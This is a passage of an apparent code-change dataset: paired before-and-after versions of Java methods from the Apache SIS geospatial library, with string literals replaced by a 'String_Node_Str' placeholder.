private void initialize(final Map<String,?> properties,final CoordinateOperation[] operations,final List<CoordinateOperation> flattened,final MathTransformFactory mtFactory,boolean setAccuracy,boolean setDomain) throws FactoryException {
  CoordinateReferenceSystem previous=null;
  for (int i=0; i < operations.length; i++) {
    final CoordinateOperation op=operations[i];
    ArgumentChecks.ensureNonNullElement(""String_Node_Str"",i,op);
    if (previous != null) {
      final CoordinateReferenceSystem next=op.getSourceCRS();
      if (next != null) {
        final int dim1=previous.getCoordinateSystem().getDimension();
        final int dim2=next.getCoordinateSystem().getDimension();
        if (dim1 != dim2) {
          throw new IllegalArgumentException(Errors.getResources(properties).getString(Errors.Keys.MismatchedDimension_3,""String_Node_Str"" + i + ""String_Node_Str"",dim1,dim2));
        }
      }
    }
    previous=op.getTargetCRS();
    MathTransform step=op.getMathTransform();
    if (op instanceof ConcatenatedOperation) {
      final List<? extends CoordinateOperation> children=((ConcatenatedOperation)op).getOperations();
      @SuppressWarnings(""String_Node_Str"") final CoordinateOperation[] asArray=children.toArray(new CoordinateOperation[children.size()]);
      initialize(properties,asArray,flattened,(step == null) ? mtFactory : null,setAccuracy,setDomain);
    }
 else {
      flattened.add(op);
    }
    if (mtFactory != null) {
      transform=(transform != null) ? mtFactory.createConcatenatedTransform(transform,step) : step;
    }
    if (setAccuracy && (op instanceof Transformation || op instanceof ConcatenatedOperation) && (PositionalAccuracyConstant.getLinearAccuracy(op) != 0)) {
      if (coordinateOperationAccuracy == null) {
        coordinateOperationAccuracy=op.getCoordinateOperationAccuracy();
      }
 else {
        coordinateOperationAccuracy=null;
        setAccuracy=false;
      }
    }
    if (setDomain) {
      final Extent domain=op.getDomainOfValidity();
      if (domain != null) {
        if (domainOfValidity == null) {
          domainOfValidity=domain;
        }
 else         if (!domain.equals(domainOfValidity)) {
          domainOfValidity=null;
          setDomain=false;
        }
      }
    }
  }
}"
91867,"/** 
 * Changes the line separator to be sent to the underlying appendable. This is the string to insert in place of every occurrences of   {@code ""\r""},   {@code ""\n""},  {@code ""\r\n""} or other {@linkplain Characters#isLineOrParagraphSeparator(int) line separators}. If   {@code null} (the default), then the line separators given to the {@code append}methods are forwarded unchanged.
 * @param lineSeparator The new line separator, or {@code null} for forwarding EOL <i>as-is</i>.
 * @see System#lineSeparator()
 * @see Characters#isLineOrParagraphSeparator(int)
 */
public void setLineSeparator(final String lineSeparator){
  this.lineSeparator=lineSeparator;
  isEndOfLineReplaced=(lineSeparator != null);
}","/** 
 * Changes the line separator to be sent to the underlying appendable. This is the string to insert in place of every occurrences of   {@code ""\r""},   {@code ""\n""},  {@code ""\r\n""} or other {@linkplain Characters#isLineOrParagraphSeparator(int) line separators}. If   {@code null} (the default), then the line separators given to the {@code append}methods are forwarded unchanged.
 * @param lineSeparator The new line separator, or {@code null} for forwarding EOL <i>as-is</i>.
 * @see Characters#isLineOrParagraphSeparator(int)
 */
public void setLineSeparator(final String lineSeparator){
  this.lineSeparator=lineSeparator;
  isEndOfLineReplaced=(lineSeparator != null);
}"
91868,"/** 
 * Sets the pattern of the characters to insert between the columns. The pattern shall contain exactly one occurrence of the   {@code ""[ ]""} pair of bracket, with exactly one characterbetween them. This character will be repeated as many time as needed for columns alignment. <p>The formatting pattern can optionally be followed by a regular expression to be used at parsing time. If omitted, the parsing pattern will be inferred from the formatting pattern. If specified, then the  {@link #parse(CharSequence,ParsePosition) parse} method will invokethe  {@link Matcher#find()} method for determining the column boundaries.</p><p>The characters listed below have special meaning in the pattern. Other characters are appended <cite>as-is</cite> between the columns.</p> <table class=""sis""> <caption>Reserved characters</caption> <tr><th>Character(s)</th> <th>Meaning</th></tr> <tr><td> {@code '?'}</td>  <td>Omit the column separator for trailing null values.</td></tr> <tr><td>  {@code ""[ ]""}</td><td>Repeat the character between bracket as needed.</td></tr> <tr><td>  {@code '/'}</td>  <td>Separate the formatting pattern from the parsing pattern.</td></tr> <tr><td>  {@code '\\'}</td> <td>Escape any of the characters listed in this table.</td></tr> </table> <div class=""section"">Restrictions</div> <ul> <li>If present,   {@code '?'} shall be the first character in the pattern.</li><li>The repeated character (specified inside the pair of brackets) is mandatory.</li> <li>In the current implementation, the repeated character must be in the {@linkplain Character#isBmpCodePoint(int) Basic Multilanguage Plane}.</li> <li>If   {@code '/'} is present, anything on its right side shall be compliantwith the  {@link Pattern} syntax.</li></ul> <div class=""note""><b>Example:</b> The  {@code ""?[] ""} pattern means <cite>""If the next value is non-null, then insert the{@code """"} string, repeat the {@code ''} character as many time as needed (may be zero),then insert a space""</cite>. </div>
 * @param pattern The pattern of the new column separator.
 * @throws IllegalArgumentException If the given pattern is illegal.
 */
public void setColumnSeparatorPattern(final String pattern) throws IllegalArgumentException {
  ArgumentChecks.ensureNonEmpty(""String_Node_Str"",pattern);
  final int length=pattern.length();
  final StringBuilder buffer=new StringBuilder(length);
  boolean escape=false;
  boolean trim=false;
  String prefix=null;
  String regex=null;
  int separatorIndex=-1;
  scan:   for (int i=0; i < length; i++) {
    final char c=pattern.charAt(i);
switch (c) {
case '\uFFFF':
{
        prefix=null;
        break scan;
      }
case '\\':
{
      if (i != separatorIndex) {
        if (escape)         break;
        escape=true;
      }
      continue;
    }
case '?':
{
    if (i != 0) {
      prefix=null;
      break scan;
    }
    trim=true;
    continue;
  }
case '[':
{
  if (escape)   break;
  if (i != separatorIndex) {
    if (separatorIndex >= 0) {
      prefix=null;
      break scan;
    }
    separatorIndex=i + 1;
  }
  continue;
}
case ']':
{
if (escape) break;
switch (i - separatorIndex) {
case 0:
  continue;
case 1:
prefix=buffer.toString();
buffer.setLength(0);
continue;
default :
prefix=null;
break scan;
}
}
case '/':
{
if (escape) break;
regex=pattern.substring(i + 1);
break scan;
}
}
if (i != separatorIndex) {
buffer.append(c);
}
}
if (prefix == null) {
throw new IllegalArgumentException(Errors.format(Errors.Keys.IllegalFormatPatternForClass_2,getValueType(),pattern));
}
if (regex != null) {
parsePattern=Pattern.compile(regex);
isParsePatternDefined=true;
}
 else {
parsePattern=null;
isParsePatternDefined=false;
}
omitTrailingNulls=trim;
beforeFill=prefix;
columnSeparator=buffer.toString();
fillCharacter=pattern.charAt(separatorIndex);
}","/** 
 * Sets the pattern of the characters to insert between the columns. The pattern shall contain exactly one occurrence of the   {@code ""[ ]""} pair of bracket, with exactly one characterbetween them. This character will be repeated as many time as needed for columns alignment. <p>The formatting pattern can optionally be followed by a regular expression to be used at parsing time. If omitted, the parsing pattern will be inferred from the formatting pattern. If specified, then the  {@link #parse(CharSequence,ParsePosition) parse} method will invokethe  {@link Matcher#find()} method for determining the column boundaries.</p><p>The characters listed below have special meaning in the pattern. Other characters are appended <cite>as-is</cite> between the columns.</p> <table class=""sis""> <caption>Reserved characters</caption> <tr><th>Character(s)</th> <th>Meaning</th></tr> <tr><td> {@code '?'}</td>  <td>Omit the column separator for trailing null values.</td></tr> <tr><td>  {@code ""[ ]""}</td><td>Repeat the character between bracket as needed.</td></tr> <tr><td>  {@code '/'}</td>  <td>Separate the formatting pattern from the parsing pattern.</td></tr> <tr><td>  {@code '\\'}</td> <td>Escape any of the characters listed in this table.</td></tr> </table> <div class=""section"">Restrictions</div> <ul> <li>If present,   {@code '?'} shall be the first character in the pattern.</li><li>The repeated character (specified inside the pair of brackets) is mandatory.</li> <li>In the current implementation, the repeated character must be in the Basic Multilanguage Plane.</li> <li>If  {@code '/'} is present, anything on its right side shall be compliantwith the  {@link Pattern} syntax.</li></ul> <div class=""note""><b>Example:</b> The  {@code ""?[] ""} pattern means <cite>""If the next value is non-null, then insert the{@code """"} string, repeat the {@code ''} character as many time as needed (may be zero),then insert a space""</cite>. </div>
 * @param pattern The pattern of the new column separator.
 * @throws IllegalArgumentException If the given pattern is illegal.
 */
public void setColumnSeparatorPattern(final String pattern) throws IllegalArgumentException {
  ArgumentChecks.ensureNonEmpty(""String_Node_Str"",pattern);
  final int length=pattern.length();
  final StringBuilder buffer=new StringBuilder(length);
  boolean escape=false;
  boolean trim=false;
  String prefix=null;
  String regex=null;
  int separatorIndex=-1;
  scan:   for (int i=0; i < length; i++) {
    final char c=pattern.charAt(i);
switch (c) {
case '\uFFFF':
{
        prefix=null;
        break scan;
      }
case '\\':
{
      if (i != separatorIndex) {
        if (escape)         break;
        escape=true;
      }
      continue;
    }
case '?':
{
    if (i != 0) {
      prefix=null;
      break scan;
    }
    trim=true;
    continue;
  }
case '[':
{
  if (escape)   break;
  if (i != separatorIndex) {
    if (separatorIndex >= 0) {
      prefix=null;
      break scan;
    }
    separatorIndex=i + 1;
  }
  continue;
}
case ']':
{
if (escape) break;
switch (i - separatorIndex) {
case 0:
  continue;
case 1:
prefix=buffer.toString();
buffer.setLength(0);
continue;
default :
prefix=null;
break scan;
}
}
case '/':
{
if (escape) break;
regex=pattern.substring(i + 1);
break scan;
}
}
if (i != separatorIndex) {
buffer.append(c);
}
}
if (prefix == null) {
throw new IllegalArgumentException(Errors.format(Errors.Keys.IllegalFormatPatternForClass_2,getValueType(),pattern));
}
if (regex != null) {
parsePattern=Pattern.compile(regex);
isParsePatternDefined=true;
}
 else {
parsePattern=null;
isParsePatternDefined=false;
}
omitTrailingNulls=trim;
beforeFill=prefix;
columnSeparator=buffer.toString();
fillCharacter=pattern.charAt(separatorIndex);
}"
91869,"/** 
 * Returns the code list or enumeration value for the given title, or   {@code null} if none.The current implementation performs the following choice: <ul> <li>If the given title is a value returned by a previous call to  {@link #getCodeTitle(CodeList<?>)}, returns the code or enumeration value used for creating that title.</li> <li>Otherwise returns   {@code null}.</li> </ul>
 * @param title The title for which to get a code or enumeration value, or {@code null}.
 * @return The code or enumeration value associated with the given title, or {@code null}.
 * @since 0.7
 * @see #getCodeTitle(CodeList<?>)
 */
public static CodeList<?> forCodeTitle(final CharSequence title){
  return (title instanceof CodeTitle) ? ((CodeTitle)title).code : null;
}","/** 
 * Returns the code list or enumeration value for the given title, or   {@code null} if none.The current implementation performs the following choice: <ul> <li>If the given title is a value returned by a previous call to  {@link #getCodeTitle(CodeList)}, returns the code or enumeration value used for creating that title.</li> <li>Otherwise returns   {@code null}.</li> </ul>
 * @param title The title for which to get a code or enumeration value, or {@code null}.
 * @return The code or enumeration value associated with the given title, or {@code null}.
 * @since 0.7
 * @see #getCodeTitle(CodeList)
 */
public static CodeList<?> forCodeTitle(final CharSequence title){
  return (title instanceof CodeTitle) ? ((CodeTitle)title).code : null;
}"
91870,"/** 
 * Returns the code of the given type that matches the given name, or optionally returns a new one if none match the name. This method performs the same work than the GeoAPI   {@code CodeList.valueOf()} method,except that this method is more tolerant on string comparisons when looking for an existing code: <ul> <li>Name comparisons are case-insensitive.</li> <li>Only  {@linkplain Character#isLetterOrDigit(int) letter and digit} characters are compared.Spaces and punctuation characters like  {@code '_'} and {@code '-'} are ignored.</li></ul> If no match is found, then a new code is created only if the  {@code canCreate} argument is {@code true}. Otherwise this method returns   {@code null}.
 * @param < T >        The compile-time type given as the {@code codeType} parameter.
 * @param codeType   The type of code list.
 * @param name       The name of the code to obtain, or {@code null}.
 * @param canCreate  {@code true} if this method is allowed to create new code.
 * @return A code matching the given name, or {@code null} if the name is nullor if no matching code is found and  {@code canCreate} is {@code false}.
 * @see #getCodeName(CodeList<?>)
 * @see CodeList#valueOf(Class,String)
 */
public static <T extends CodeList<T>>T forCodeName(final Class<T> codeType,String name,final boolean canCreate){
  name=CharSequences.trimWhitespaces(name);
  if (name == null || name.isEmpty()) {
    return null;
  }
  final String typeName=codeType.getName();
  try {
    Class.forName(typeName,true,codeType.getClassLoader());
  }
 catch (  ClassNotFoundException e) {
    throw new TypeNotPresentException(typeName,e);
  }
  return CodeList.valueOf(codeType,new CodeListFilter(name,canCreate));
}","/** 
 * Returns the code of the given type that matches the given name, or optionally returns a new one if none match the name. This method performs the same work than the GeoAPI   {@code CodeList.valueOf()} method,except that this method is more tolerant on string comparisons when looking for an existing code: <ul> <li>Name comparisons are case-insensitive.</li> <li>Only  {@linkplain Character#isLetterOrDigit(int) letter and digit} characters are compared.Spaces and punctuation characters like  {@code '_'} and {@code '-'} are ignored.</li></ul> If no match is found, then a new code is created only if the  {@code canCreate} argument is {@code true}. Otherwise this method returns   {@code null}.
 * @param < T >        The compile-time type given as the {@code codeType} parameter.
 * @param codeType   The type of code list.
 * @param name       The name of the code to obtain, or {@code null}.
 * @param canCreate  {@code true} if this method is allowed to create new code.
 * @return A code matching the given name, or {@code null} if the name is nullor if no matching code is found and  {@code canCreate} is {@code false}.
 * @see #getCodeName(CodeList)
 * @see CodeList#valueOf(Class,String)
 */
public static <T extends CodeList<T>>T forCodeName(final Class<T> codeType,String name,final boolean canCreate){
  name=CharSequences.trimWhitespaces(name);
  if (name == null || name.isEmpty()) {
    return null;
  }
  final String typeName=codeType.getName();
  try {
    Class.forName(typeName,true,codeType.getClassLoader());
  }
 catch (  ClassNotFoundException e) {
    throw new TypeNotPresentException(typeName,e);
  }
  return CodeList.valueOf(codeType,new CodeListFilter(name,canCreate));
}"
91871,"/** 
 * Prints the name and authority code (if any) of the given object.
 */
private void printNameAndIdentifier(final IdentifiedObject object){
  outHeader.append(object.getName().getCode());
  final String identifier=IdentifiedObjects.toString(IdentifiedObjects.getIdentifier(object,null));
  if (identifier != null) {
    outHeader.append(' ');
    if (colors) {
      outHeader.append(X364.FOREGROUND_CYAN.sequence());
    }
    outHeader.append('(');
    outHeader.append(identifier);
    outHeader.append(')');
    if (colors) {
      outHeader.append(X364.FOREGROUND_DEFAULT.sequence());
    }
  }
  outHeader.nextLine();
}","/** 
 * Prints the name and authority code (if any) of the given object.
 * @param object      the object for which to print name and identifier.
 * @param idRequired  {@code true} for printing the name only if an identifier is present.
 * @return whether this method has printed something.
 */
private boolean printNameAndIdentifier(final IdentifiedObject object,final boolean idRequired){
  final String identifier=IdentifiedObjects.toString(IdentifiedObjects.getIdentifier(object,null));
  if (idRequired && identifier == null) {
    return false;
  }
  outHeader.append(object.getName().getCode());
  if (identifier != null) {
    outHeader.append(' ');
    if (colors) {
      outHeader.append(X364.FOREGROUND_CYAN.sequence());
    }
    outHeader.append('(');
    outHeader.append(identifier);
    outHeader.append(')');
    if (colors) {
      outHeader.append(X364.FOREGROUND_DEFAULT.sequence());
    }
  }
  if (!idRequired) {
    outHeader.nextLine();
  }
  return true;
}"
91872,"/** 
 * Transforms coordinates from the files given in argument or from the standard input stream.
 */
@Override public int run() throws Exception {
  parseArguments();
  if (outputFormat == Format.XML) {
    final String format=outputFormat.name();
    throw new InvalidOptionException(Errors.format(Errors.Keys.IncompatibleFormat_2,""String_Node_Str"",format),format);
  }
  operation=CRS.findOperation(fetchCRS(Option.SOURCE_CRS),fetchCRS(Option.TARGET_CRS),null);
  outHeader=new TableAppender(new LineAppender(out),""String_Node_Str"");
  outHeader.setMultiLinesCells(true);
  printHeader(Vocabulary.Keys.Source);
  printNameAndIdentifier(operation.getSourceCRS());
  printHeader(Vocabulary.Keys.Destination);
  printNameAndIdentifier(operation.getTargetCRS());
  printHeader(Vocabulary.Keys.Methods);
  printOperationMethods(operation,false);
  outHeader.nextLine();
  if (options.containsKey(Option.VERBOSE)) {
    final WKTFormat f=new WKTFormat(locale,timezone);
    f.setConvention(options.containsKey(Option.DEBUG) ? Convention.INTERNAL : convention);
    if (colors) {
      f.setColors(Colors.DEFAULT);
    }
    final CharSequence[] lines=CharSequences.splitOnEOL(f.format(operation.getMathTransform()));
    for (int i=0; i < lines.length; i++) {
      if (i == 0) {
        printHeader(Vocabulary.Keys.Details);
      }
 else {
        printCommentLinePrefix();
        outHeader.nextColumn();
      }
      outHeader.append(lines[i]);
      outHeader.nextLine();
    }
  }
  double accuracy=CRS.getLinearAccuracy(operation);
  if (accuracy >= 0) {
    if (accuracy == 0) {
      accuracy=Formulas.LINEAR_TOLERANCE;
    }
    printHeader(Vocabulary.Keys.Accuracy);
    if (colors) {
      outHeader.append(X364.FOREGROUND_YELLOW.sequence());
    }
    outHeader.append(Double.toString(accuracy));
    if (colors) {
      outHeader.append(X364.FOREGROUND_DEFAULT.sequence());
    }
    outHeader.append(""String_Node_Str"");
    outHeader.nextLine();
  }
  outHeader.flush();
  outHeader=null;
  final boolean useStandardInput=useStandardInput();
  if (useStandardInput || !files.isEmpty()) {
    computeDomainOfValidity();
    ordinateWidth=15;
    coordinateFormat=NumberFormat.getInstance(Locale.US);
    coordinateFormat.setGroupingUsed(false);
    computeNumFractionDigits(operation.getTargetCRS().getCoordinateSystem());
    out.println();
    printAxes(operation.getTargetCRS().getCoordinateSystem());
    out.println();
    if (useStandardInput) {
      final LineNumberReader in=new LineNumberReader(new InputStreamReader(System.in,encoding));
      try {
        transform(in,""String_Node_Str"");
      }
  finally {
        in.close();
      }
    }
 else {
      for (      final String file : files) {
        final LineNumberReader in=new LineNumberReader(new InputStreamReader(new FileInputStream(file),encoding));
        try {
          transform(in,file);
        }
  finally {
          in.close();
        }
      }
    }
  }
  return 0;
}","/** 
 * Transforms coordinates from the files given in argument or from the standard input stream.
 */
@Override public int run() throws Exception {
  parseArguments();
  if (outputFormat == Format.XML) {
    final String format=outputFormat.name();
    throw new InvalidOptionException(Errors.format(Errors.Keys.IncompatibleFormat_2,""String_Node_Str"",format),format);
  }
  final CoordinateReferenceSystem sourceCRS=fetchCRS(Option.SOURCE_CRS);
  final CoordinateReferenceSystem targetCRS=fetchCRS(Option.TARGET_CRS);
  GeographicBoundingBox areaOfInterest=null;
  List<double[]> points=Collections.emptyList();
  final boolean useStandardInput=useStandardInput();
  if (useStandardInput || !files.isEmpty()) {
    if (useStandardInput) {
      LineNumberReader in=new LineNumberReader(new InputStreamReader(System.in,encoding));
      try {
        points=readCoordinates(in,""String_Node_Str"");
      }
  finally {
        in.close();
      }
    }
 else {
      for (      final String file : files) {
        LineNumberReader in=new LineNumberReader(new InputStreamReader(new FileInputStream(file),encoding));
        try {
          points=readCoordinates(in,file);
        }
  finally {
          in.close();
        }
      }
    }
    try {
      final GeographicCRS domainOfValidityCRS=ReferencingUtilities.toNormalizedGeographicCRS(sourceCRS);
      if (domainOfValidityCRS != null) {
        toDomainOfValidity=CRS.findOperation(sourceCRS,domainOfValidityCRS,null).getMathTransform();
        areaOfInterest=computeAreaOfInterest(points);
      }
    }
 catch (    FactoryException e) {
      warning(e);
    }
  }
  operation=CRS.findOperation(sourceCRS,targetCRS,areaOfInterest);
  outHeader=new TableAppender(new LineAppender(out),""String_Node_Str"");
  outHeader.setMultiLinesCells(true);
  printHeader(Vocabulary.Keys.Source);
  printNameAndIdentifier(operation.getSourceCRS(),false);
  printHeader(Vocabulary.Keys.Destination);
  printNameAndIdentifier(operation.getTargetCRS(),false);
  printHeader(Vocabulary.Keys.Operations);
  printOperations(operation,false);
  outHeader.nextLine();
  printDomainOfValidity(operation.getDomainOfValidity());
  printAccuracy(CRS.getLinearAccuracy(operation));
  if (options.containsKey(Option.VERBOSE)) {
    printDetails();
  }
  outHeader.flush();
  outHeader=null;
  if (!points.isEmpty()) {
    ordinateWidth=15;
    coordinateFormat=NumberFormat.getInstance(Locale.US);
    coordinateFormat.setGroupingUsed(false);
    computeNumFractionDigits(operation.getTargetCRS().getCoordinateSystem());
    out.println();
    printAxes(operation.getTargetCRS().getCoordinateSystem());
    out.println();
    transform(points);
    if (errorMessage != null) {
      error(errorMessage,errorCause);
    }
  }
  return 0;
}"
91873,"/** 
 * Transforms the coordinates read from the given stream. This method ignores empty and comment lines.
 * @param in        the stream from where to read coordinates.
 * @param filename  the filename, for error reporting only.
 * @return the errors that occurred during transformation.
 */
private void transform(final LineNumberReader in,final String filename) throws IOException {
  final int dimension=operation.getSourceCRS().getCoordinateSystem().getDimension();
  final MathTransform mt=operation.getMathTransform();
  final double[] result=new double[mt.getTargetDimensions()];
  final double[] domainCoordinate;
  final DirectPositionView positionInDomain;
  if (toDomainOfValidityCRS != null) {
    domainCoordinate=new double[toDomainOfValidityCRS.getTargetDimensions()];
    positionInDomain=new DirectPositionView(domainCoordinate,0,domainCoordinate.length);
  }
 else {
    domainCoordinate=null;
    positionInDomain=null;
  }
  try {
    String line;
    while ((line=in.readLine()) != null) {
      final int start=CharSequences.skipLeadingWhitespaces(line,0,line.length());
      if (start < line.length() && line.charAt(start) != '#') {
        final double[] coordinates=CharSequences.parseDoubles(line,',');
        if (coordinates.length != dimension) {
          throw new MismatchedDimensionException(Errors.format(Errors.Keys.MismatchedDimensionForCRS_3,operation.getSourceCRS().getName().getCode(),dimension,coordinates.length));
        }
        mt.transform(coordinates,0,result,0,1);
        for (int i=0; i < result.length; i++) {
          if (i != 0) {
            out.print(',');
          }
          final double value=result[i];
          final String s;
          if (Math.abs(value) >= thresholdForScientificNotation[i]) {
            s=Double.toString(value);
          }
 else {
            coordinateFormat.setMinimumFractionDigits(numFractionDigits[i]);
            coordinateFormat.setMaximumFractionDigits(numFractionDigits[i]);
            s=coordinateFormat.format(value);
          }
          out.print(CharSequences.spaces(ordinateWidth - s.length()));
          out.print(s);
        }
        if (domainCoordinate != null) {
          boolean inside;
          try {
            toDomainOfValidityCRS.transform(coordinates,0,domainCoordinate,0,1);
            inside=domainOfValidity.contains(positionInDomain);
          }
 catch (          TransformException e) {
            inside=false;
            warning(e);
          }
          if (!inside) {
            out.print(""String_Node_Str"");
            printQuotedText(Errors.getResources(locale).getString(Errors.Keys.OutsideDomainOfValidity),0,X364.FOREGROUND_RED);
          }
        }
        out.println();
      }
    }
  }
 catch (  Exception e) {
    error(Errors.format(Errors.Keys.ErrorInFileAtLine_2,filename,in.getLineNumber()),e);
  }
}","/** 
 * Transforms the given coordinates.
 */
private void transform(final List<double[]> points) throws TransformException {
  final int dimension=operation.getSourceCRS().getCoordinateSystem().getDimension();
  final MathTransform mt=operation.getMathTransform();
  final double[] result=new double[mt.getTargetDimensions()];
  final double[] domainCoordinate;
  final DirectPositionView positionInDomain;
  final ImmutableEnvelope domainOfValidity;
  final GeographicBoundingBox bbox;
  if (toDomainOfValidity != null && (bbox=CRS.getGeographicBoundingBox(operation)) != null) {
    domainOfValidity=new ImmutableEnvelope(bbox);
    domainCoordinate=new double[toDomainOfValidity.getTargetDimensions()];
    positionInDomain=new DirectPositionView(domainCoordinate,0,domainCoordinate.length);
  }
 else {
    domainOfValidity=null;
    domainCoordinate=null;
    positionInDomain=null;
  }
  for (  final double[] coordinates : points) {
    if (coordinates.length != dimension) {
      throw new MismatchedDimensionException(Errors.format(Errors.Keys.MismatchedDimensionForCRS_3,operation.getSourceCRS().getName().getCode(),dimension,coordinates.length));
    }
    mt.transform(coordinates,0,result,0,1);
    for (int i=0; i < result.length; i++) {
      if (i != 0) {
        out.print(',');
      }
      final double value=result[i];
      final String s;
      if (Math.abs(value) >= thresholdForScientificNotation[i]) {
        s=Double.toString(value);
      }
 else {
        coordinateFormat.setMinimumFractionDigits(numFractionDigits[i]);
        coordinateFormat.setMaximumFractionDigits(numFractionDigits[i]);
        s=coordinateFormat.format(value);
      }
      out.print(CharSequences.spaces(ordinateWidth - s.length()));
      out.print(s);
    }
    if (domainOfValidity != null) {
      boolean inside;
      try {
        toDomainOfValidity.transform(coordinates,0,domainCoordinate,0,1);
        inside=domainOfValidity.contains(positionInDomain);
      }
 catch (      TransformException e) {
        inside=false;
        warning(e);
      }
      if (!inside) {
        out.print(""String_Node_Str"");
        printQuotedText(Errors.getResources(locale).getString(Errors.Keys.OutsideDomainOfValidity),0,X364.FOREGROUND_RED);
      }
    }
    out.println();
  }
}"
91874,"/** 
 * Returns the identified object for the specified value, creating it if needed.
 * @throws BackingStoreException if the object creation failed.
 * @see #createObject(String)
 */
final T get(final String code) throws BackingStoreException {
  T object;
  boolean success;
synchronized (objects) {
    object=objects.get(code);
    success=(object != null || !objects.containsKey(code));
  }
  if (!success) {
    try {
      object=createObject(code);
      success=true;
    }
 catch (    FactoryException exception) {
      if (!isRecoverableFailure(exception)) {
        throw new BackingStoreException(exception);
      }
      final LogRecord record=Messages.getResources(null).getLogRecord(Level.WARNING,Messages.Keys.CanNotInstantiateForIdentifier_3,type,code,getCause(exception));
      record.setLoggerName(Loggers.CRS_FACTORY);
      Logging.log(IdentifiedObjectSet.class,""String_Node_Str"",record);
    }
synchronized (objects) {
      if (success) {
        if (objects.containsKey(code)) {
          final T c=JDK8.putIfAbsent(objects,code,object);
          if (c != null) {
            object=c;
          }
 else {
            codes=null;
          }
        }
      }
 else       if (JDK8.remove(objects,code,null)) {
        codes=null;
      }
    }
  }
  return object;
}","/** 
 * Returns the identified object for the specified value, creating it if needed.
 * @throws BackingStoreException if the object creation failed.
 * @see #createObject(String)
 */
final T get(final String code) throws BackingStoreException {
  T object;
  boolean success;
synchronized (objects) {
    object=objects.get(code);
    success=(object != null || !objects.containsKey(code));
  }
  if (!success) {
    try {
      object=createObject(code);
      success=true;
    }
 catch (    FactoryException exception) {
      if (!isRecoverableFailure(exception)) {
        throw new BackingStoreException(exception);
      }
      final LogRecord record=Messages.getResources(getLocale()).getLogRecord(Level.WARNING,Messages.Keys.CanNotInstantiateForIdentifier_3,type,code,getCause(exception));
      record.setLoggerName(Loggers.CRS_FACTORY);
      Logging.log(IdentifiedObjectSet.class,""String_Node_Str"",record);
    }
synchronized (objects) {
      if (success) {
        if (objects.containsKey(code)) {
          final T c=JDK8.putIfAbsent(objects,code,object);
          if (c != null) {
            object=c;
          }
 else {
            codes=null;
          }
        }
      }
 else       if (JDK8.remove(objects,code,null)) {
        codes=null;
      }
    }
  }
  return object;
}"
91875,"/** 
 * Creates operations from source and target coordinate reference system codes. This method only extract the information explicitely declared in the EPSG database; it does not attempt to infer by itself operations that are not explicitely recorded in the database. <p>The returned set is ordered with the most accurate operations first.</p>
 * @param sourceCRS  Coded value of source coordinate reference system.
 * @param targetCRS  Coded value of target coordinate reference system.
 * @return The operations from {@code sourceCRS} to {@code targetCRS}.
 * @throws NoSuchAuthorityCodeException if a specified code was not found.
 * @throws FactoryException if the object creation failed for some other reason.
 */
@Override public synchronized Set<CoordinateOperation> createFromCoordinateReferenceSystemCodes(final String sourceCRS,final String targetCRS) throws FactoryException {
  ArgumentChecks.ensureNonNull(""String_Node_Str"",sourceCRS);
  ArgumentChecks.ensureNonNull(""String_Node_Str"",targetCRS);
  final String label=sourceCRS + ""String_Node_Str"" + targetCRS;
  final CoordinateOperationSet set=new CoordinateOperationSet(owner);
  try {
    final int[] pair=toPrimaryKeys(null,null,null,sourceCRS,targetCRS);
    boolean searchTransformations=false;
    do {
      final String key, sql;
      if (searchTransformations) {
        key=""String_Node_Str"";
        sql=""String_Node_Str"" + ""String_Node_Str"" + ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str"";
      }
 else {
        key=""String_Node_Str"";
        sql=""String_Node_Str"" + ""String_Node_Str"" + ""String_Node_Str""+ ""String_Node_Str"";
      }
      final Integer targetKey=searchTransformations ? null : pair[1];
      final ResultSet result=executeQuery(key,sql,pair);
      try {
        while (result.next()) {
          set.addAuthorityCode(getString(label,result,1),targetKey);
        }
      }
  finally {
        result.close();
      }
    }
 while ((searchTransformations=!searchTransformations) == true);
    final String[] codes=set.getAuthorityCodes();
    if (codes.length > 1 && sort(""String_Node_Str"",codes)) {
      set.setAuthorityCodes(codes);
    }
  }
 catch (  SQLException exception) {
    throw databaseFailure(CoordinateOperation.class,label,exception);
  }
  set.resolve(1);
  return set;
}","/** 
 * Creates operations from source and target coordinate reference system codes. This method only extract the information explicitely declared in the EPSG database; it does not attempt to infer by itself operations that are not explicitely recorded in the database. <p>The returned set is ordered with the most accurate operations first. Deprecated operations are not included in the set; if a deprecated operation is really wanted, it can be fetched by an explicit call to   {@link #createCoordinateOperation(String)}.</p>
 * @param sourceCRS  Coded value of source coordinate reference system.
 * @param targetCRS  Coded value of target coordinate reference system.
 * @return The operations from {@code sourceCRS} to {@code targetCRS}.
 * @throws NoSuchAuthorityCodeException if a specified code was not found.
 * @throws FactoryException if the object creation failed for some other reason.
 */
@Override public synchronized Set<CoordinateOperation> createFromCoordinateReferenceSystemCodes(final String sourceCRS,final String targetCRS) throws FactoryException {
  ArgumentChecks.ensureNonNull(""String_Node_Str"",sourceCRS);
  ArgumentChecks.ensureNonNull(""String_Node_Str"",targetCRS);
  final String label=sourceCRS + ""String_Node_Str"" + targetCRS;
  final CoordinateOperationSet set=new CoordinateOperationSet(owner);
  try {
    final int[] pair=toPrimaryKeys(null,null,null,sourceCRS,targetCRS);
    boolean searchTransformations=false;
    do {
      final String key, sql;
      if (searchTransformations) {
        key=""String_Node_Str"";
        sql=""String_Node_Str"" + ""String_Node_Str"" + ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str"";
      }
 else {
        key=""String_Node_Str"";
        sql=""String_Node_Str"" + ""String_Node_Str"" + ""String_Node_Str""+ ""String_Node_Str"";
      }
      final Integer targetKey=searchTransformations ? null : pair[1];
      final ResultSet result=executeQuery(key,sql,pair);
      try {
        while (result.next()) {
          set.addAuthorityCode(getString(label,result,1),targetKey);
        }
      }
  finally {
        result.close();
      }
    }
 while ((searchTransformations=!searchTransformations) == true);
    final String[] codes=set.getAuthorityCodes();
    if (codes.length > 1 && sort(""String_Node_Str"",codes)) {
      set.setAuthorityCodes(codes);
    }
  }
 catch (  SQLException exception) {
    throw databaseFailure(CoordinateOperation.class,label,exception);
  }
  set.resolve(1);
  return set;
}"
91876,"/** 
 * Returns an operation for conversion or transformation between two coordinate reference systems. This method extracts the authority code from the supplied   {@code sourceCRS} and {@code targetCRS}, and submit them to the   {@link #registry}. If no operation is found for those codes, then this method returns   {@code null}.
